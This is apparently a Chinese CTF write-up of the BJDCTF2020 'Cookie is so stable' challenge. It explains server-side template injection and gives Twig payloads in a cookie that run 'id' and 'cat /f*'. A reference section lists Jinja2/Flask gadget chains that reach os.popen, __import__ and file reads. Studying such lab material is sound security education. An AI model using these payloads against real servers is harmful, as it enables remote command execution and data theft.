# [BJDCTF2020]Cookie is so stable 模板注入SSTI

这个题目已经在提示我们了

然后我们去hint看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/06e1109f6a56682f9f58c97664fce95b.png" alt="" style="max-height:122px; box-sizing:content-box;" />


让我们看看cookie 那我们肯定直接抓包啊



<img src="https://i-blog.csdnimg.cn/blog_migrate/5099edfabf820c7c42dbd595a20526eb.png" alt="" style="max-height:227px; box-sizing:content-box;" />
  
cookie中存在回显值 但是我觉得一眼看上去就不是sql注入 因为是我们提交东西 而且没有查询的东西

所以我们可以想到是不是其他注入 于是就思考到是不是模板注入

## 模板注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/d4e4c4a246f8719c26e0f16844e65b13.png" alt="" style="max-height:386px; box-sizing:content-box;" />


模板注入 主要是服务器 可以通过表达式 直接解析

但是如果到了用户的手里 那么可以生成恶意的代码 对服务器造成危险

主要是通过 ${{}}来检测  就是{{1+1}} 如果回显是2 那么就说明存在模板注入

这里就可以通过上面的图片做题了 但是我们主要是学习

所以我们看看

## SSTI原理

我们了解东西 首先要了解这个是什么

### 模板引擎

```undefined
模板引擎主要是web的开发中 为了将用户操作和数据分离而存在的
 
将模板文件和数据整合输出
 
引擎的底层逻辑就是
 
通过 字符替换实现数据的传递
 
通过正则表达式匹配占位符 然后将数据替换到占位符上
```

### SSTI

```sql
SSTI 服务端模板注入 其实就是前端用户可控的地方
 
和sql注入一样 没有对其进行严格的过滤 让前端可以直接读取后端数据
```

### Jinja2

```crystal
通过python 设计模板语言
 
{% %}声明变量 和执行语句
 
{{}} 将表达式输出到模板上
 
{# #} 用于注释
```

到这里 差不多很基础的SSTI就介绍了

## 做题

通过上面的图片来判断是哪种类型



<img src="https://i-blog.csdnimg.cn/blog_migrate/51c53b51d2e970117785b0b4ad3f3375.png" alt="" style="max-height:133px; box-sizing:content-box;" />


这里还有知识点

我们输入 {{7*'7'}} 如果输出 49 就是Twig模块 如果是7777777 就是Jinja2 模块

所以我们确定了是 Twig模块

对于这个模块我们有固定的攻击

```handlebars
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}//查看id

```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9ec51a9767971bd2c1b0ccae4ad12b27.png" alt="" style="max-height:185px; box-sizing:content-box;" />


```handlebars
user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /f*")}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/34ac3672a5fa3b0603755430dbdec1c3.png" alt="" style="max-height:190px; box-sizing:content-box;" />


这样就得到了flag

## 补充

我们继续补充知识点

### 常用类

因为模板注入 可以使用python代码

所以我们来了解一下

#### __class__

```markdown
__class__ 来了解变量所属的类
 
使用方法    变量.__class__
```

```cobol
>>> ''.__class__
<class 'str'>
>>> ().__class__
<class 'tuple'>
>>> {}.__class__
<class 'dict'>
>>> [].__class__
<class 'list'>
```

#### __bases__

```markdown
__bases__ 用来查看类的基类
 
因为是查看类的 
 
所以我们首先要通过__class__获取类
 
使用方法  变量.__class__.__bases__
```

```cobol
>>> ''.__class__.__bases__
(<class 'object'>,)
>>> ().__class__.__bases__
(<class 'object'>,)
>>> {}.__class__.__bases__
(<class 'object'>,)
>>> [].__class__.__bases__
(<class 'object'>,)
```

#### __mro__

```markdown
显示基类和类
 
变量.__class__.__mro__
```

```cobol
>>> [].__class__.__mro__
(<class 'list'>, <class 'object'>)
```

#### subclasses()

```markdown
用来查看当前类的子类
 
可以通过数组来指定读取
 
使用方法
 
变量.__class__.__bases__[0].__subclasses__()
 
需要指定基类
```

```cobol
>>> ''.__class__.__bases__[0].__subclasses__()

 
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class 'PyHKEY'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_multibytecodec.MultibyteCodec'>, <class '_multibytecodec.MultibyteIncrementalEncoder'>, <class '_multibytecodec.MultibyteIncrementalDecoder'>, <class '_multibytecodec.MultibyteStreamReader'>, <class '_multibytecodec.MultibyteStreamWriter'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class '_winapi.Overlapped'>, <class 'os._wrap_close'>, <class 'os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib._abc.Loader'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncConte_._Feature'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.STARTUPINFO'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'platform._Processor'>, <class 'CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class '_ctypes.StructParam_Type'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'tokenize.Untokenizer'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_queue.SimpleQueue'>, <class 'queue.Queue'>, <class 'queue._PySimpleQueue'>, <class 'logging.handlers.QueueListener'>, <class 'pyreadline3.logger.SocketStream'>, <class 'pyreadline3.keysyms.common.KeyPress'>, <class 'pyreadline3.console.event.Event'>, <class 'pyreadline3.console.ansi.AnsiState'>, <class 'pyreadline3.console.ansi.AnsiWriter'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'pyreadline3.console.console.Console'>, <class 'pyreadline3.lineeditor.lineobj.LinePositioner'>, <class 'pyreadline3.lineeditor.lineobj.LineSlice'>, <class 'pyreadline3.lineeditor.lineobj.TextLine'>, <class 'pyreadline3.lineeditor.history.LineHistory'>, <class 'pyreadline3.modes.basemode.BaseMode'>, <class 'pyreadline3.modes.emacs.IncrementalSearchPromptMode'>, <class 'pyreadline3.modes.emacs.SearchPromptMode'>, <class 'pyreadline3.modes.emacs.DigitArgumentMode'>, <class 'pyreadline3.modes.vi.ViCommand'>, <class 'pyreadline3.modes.vi.ViExternalEditor'>, <class 'pyreadline3.modes.vi.ViEvent'>, <class 'pyreadline3.rlmain.MockConsole'>, <class 'pyreadline3.rlmain.BaseReadline'>, <class 'ast.AST'>, <class 'ast.NodeVisitor'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'rlcompleter.Completer'>]
```

### 类的转载

```cobol
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。
 
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>
```

过滤器

```cobol
常用的过滤器
 
int()：将值转换为int类型；
 
float()：将值转换为float类型；
 
lower()：将字符串转换为小写；
 
upper()：将字符串转换为大写；
 
title()：把值中的每个单词的首字母都转成大写；
 
capitalize()：把变量值的首字母转成大写，其余字母转小写；
 
trim()：截取字符串前面和后面的空白字符；
 
wordcount()：计算一个长字符串中单词的个数；
 
reverse()：字符串反转；
 
replace(value,old,new)： 替换将old替换为new的字符串；
 
truncate(value,length=255,killwords=False)：截取length长度的字符串；
 
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
 
escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。
 
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；
 
list()：将变量列成列表；
 
string()：将变量转换成字符串；
 
join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
 
abs()：返回一个数值的绝对值；
 
first()：返回一个序列的第一个元素；
 
last()：返回一个序列的最后一个元素；
 
format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
 
length()：返回一个序列或者字典的长度；
 
sum()：返回列表内数值的和；
 
sort()：返回排序后的列表；
 
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
 
length()返回字符串的长度，别名是count
 
```

 [SSTI入门详解___builtins__ ssti_hahahahaha!的博客-CSDN博客](https://blog.csdn.net/weixin_51353029/article/details/111503731)